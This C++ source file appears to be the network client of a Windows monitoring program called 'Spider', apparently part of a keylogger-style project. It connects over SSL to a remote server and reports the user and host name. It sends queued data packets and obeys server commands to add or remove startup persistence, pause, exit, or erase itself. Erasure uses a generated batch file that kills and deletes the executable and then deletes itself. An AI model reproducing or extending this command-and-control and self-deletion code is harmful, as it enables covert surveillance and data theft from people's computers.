#include <iostream>
#include <boost/thread.hpp>
#include <boost/filesystem.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include "reseau/Network.hh"
#include "paquetFirstClient.hh"
#include "paquetCommandServer.hh"
#include "paquetCommandClient.hh"

#ifndef CERTIFICATE_FILE
# define CERTIFICATE_FILE ("client.crt")
#endif

Network::Network(const std::string& port, const std::string& ip, Packager* packager, const std::string& crt) :
	_port(port), _ip(ip), _ctx(boost::asio::ssl::context::sslv23), _packager(packager)
{
	_pause = 0;

	boost::asio::ip::tcp::resolver resolver(_ios);
	boost::asio::ip::tcp::resolver::query query(ip, port);
	_iterator = resolver.resolve(query);

	_ctx.load_verify_file(crt);
	_ctx.set_verify_mode(boost::asio::ssl::context::verify_peer);
	_engine = new SslEngine(_ios, _ctx);

	_response[3] = [this](boost::asio::yield_context yield) {};
	_response[4] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
	_response[5] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
	_response[6] = [this](boost::asio::yield_context yield) { spider_exit(*this, yield); };
	_response[7] = [this](boost::asio::yield_context yield) { spider_pause(*this, yield); };
	_response[8] = [this](boost::asio::yield_context yield) { spider_remove(*this, yield); };

}


Network::~Network() {
	if (_engine)
		delete _engine;
}

void Network::initNetwork() {
	boost::asio::spawn(_ios, [this](boost::asio::yield_context yield) {
		boost::asio::ip::tcp::endpoint endpoint = *_iterator;
		boost::system::error_code ec;

		for (;;) {
				std::cout << "Trying to connect to the server" << std::endl;
				_engine->getSocket().async_connect(endpoint, yield[ec]);
				if (!ec) {
					std::cout << "SSL: initializing HandShake" << std::endl;
					_engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
					if (!ec) {
						sendFirstPaquet(yield);
					}
				}
				_engine->getSocket().close();
		}});
	_ios.run();
}

void Network::sendFirstPaquet(boost::asio::yield_context yield)
{
	PaquetFirstClient	paquet;


	DWORD	size = 128;
	char hostName[128];
	char username[128];

	GetUserNameA(username, &size);
	gethostname(hostName, sizeof(hostName));

	paquet.setVersion(1);
	paquet.setName(std::string(username) + "@" + std::string(hostName));
	paquet.setDate(SelfUtils::secondsSinceEpoch());
	paquet.createPaquet();

	if (_engine->writePaquet(paquet, yield)) {
	  return ;
	}
	uint8_t id;
	uint8_t ret;
	if (_engine->async_read(&id, 1, yield)) {
	  return ;
	}
	if (_engine->async_read(&ret, 1, yield)) {
	  return ;
	}
	std::cout << "SSL: server RET value " << (int)ret << std::endl;
	if (ret == 2) {
		boost::thread readThread(&Network::readLoop, this, yield);
		writeLoop(yield);
		readThread.join();
	}
	else
	{
	  std::cerr << "SSl: Error: Wrong protocol version" << std::endl;
	}
}

void Network::writeLoop(boost::asio::yield_context yield)
{
	while (1) {

		_packager->isLeft();
		std::cout << "Packager: OK" << std::endl;
		Paquet *paquet = _packager->getPaquet();
			if (_pause == 0) {
				std::cout << "Network Sending Paquet: " << *paquet << std::endl;
				if (_engine->writePaquet(*paquet, yield) == -1) {
					return;
				}
			}
		_packager->supprPaquet();
	}
}

void Network::readLoop(boost::asio::yield_context yield)
{
	PaquetCommandServer paquet;

	while (!_engine->read(paquet)) {
		if (_response.count(paquet.getReponse()) > 0)
			_response[paquet.getReponse()](yield);
		else
		{
			PaquetCommandClient paquet;
			paquet.setOk(0);
			paquet.createPaquet();
			_engine->writePaquet(paquet, yield);
		}
		std::cout << "Network Receiving paquet: " << paquet << std::endl;
	}
}

void Network::spider_switchStartup(Network &net, boost::asio::yield_context yield)
{
	PaquetCommandClient paquet;

	paquet.setOk(1);
	if (_startup.isStartup()) {
		_startup.delStartup();
		if (_startup.isStartup()) {
			paquet.setOk(0);
		}
	}
	else {
		_startup.addStartup(_ip, _port);
		if (!_startup.isStartup()) {
			paquet.setOk(0);
		}
	}

	paquet.createPaquet();
	net.getEngine().writePaquet(paquet, yield);
}

void Network::spider_exit(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient paquet;

	paquet.setOk(1);
	std::cout << "Exiting Spider..." << std::endl;
	paquet.createPaquet();
	net.getEngine().writePaquet(paquet, yield);
	exit(EXIT_SUCCESS);
}

void Network::spider_remove(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient paquet;
	HMODULE	hModule = GetModuleHandle(NULL);

	if (hModule)
	{
		WCHAR	path[MAX_PATH];

		paquet.setOk(1);
		GetModuleFileName(hModule, path, MAX_PATH);
		std::wstring wpath = path;
		std::string str(wpath.begin(), wpath.end());
		std::cout << "Remove: " << str << std::endl;
		std::ofstream f("rmv.bat");
		if (!f.is_open()) {
			paquet.setOk(0);
		}
		else {
			f << "@ECHO off" << std::endl
				<< "ping 127.0.0.1 -n 2 > nul" << std::endl
				<< "TASKKILL /F /IM Spider.exe >nul" << std::endl
				<< "ping 127.0.0.1 - n 3 > nul" << std::endl
				<< "del Spider.exe >nul" << std::endl
				<< "ping 127.0.0.1 -n 2 > nul" << std::endl
				<< "(goto) 2>nul & del \"%~f0\" >nul" << std::endl;
			paquet.createPaquet();
			net.getEngine().writePaquet(paquet, yield);
			system("rmv.bat");
			exit(EXIT_SUCCESS);
		}
	}
	else
		paquet.setOk(0);
	paquet.createPaquet();
	net.getEngine().writePaquet(paquet, yield);
}

void Network::spider_pause(Network& net, boost::asio::yield_context yield) {
	PaquetCommandClient paquet;

	paquet.setOk(1);
	if (net.getPause() == 0)
		net.setPause(1);
	else
		net.setPause(0);
	paquet.createPaquet();
	net.getEngine().writePaquet(paquet, yield);
}
